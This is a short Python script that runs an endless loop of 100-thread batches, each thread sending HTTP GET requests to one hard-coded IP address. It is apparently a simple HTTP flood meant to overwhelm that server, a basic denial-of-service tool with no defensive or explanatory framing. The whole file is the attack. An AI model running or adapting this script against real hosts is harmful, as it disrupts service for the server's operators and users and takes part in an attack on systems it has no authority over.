import requests
import threading
import random

def fetch(address):
  page = ["404", "502", "403"]
  requests.get(address)

if __name__ == "__main__":
  while True:
    threads = []
    for i in range(100):
      thread = threading.Thread(target=fetch, args=("http://52.18.251.148",))
      threads.append(thread)
    for item in threads:
      item.start()
      print(threading.active_count())
      if threading.active_count() >= 100:
        item.join()
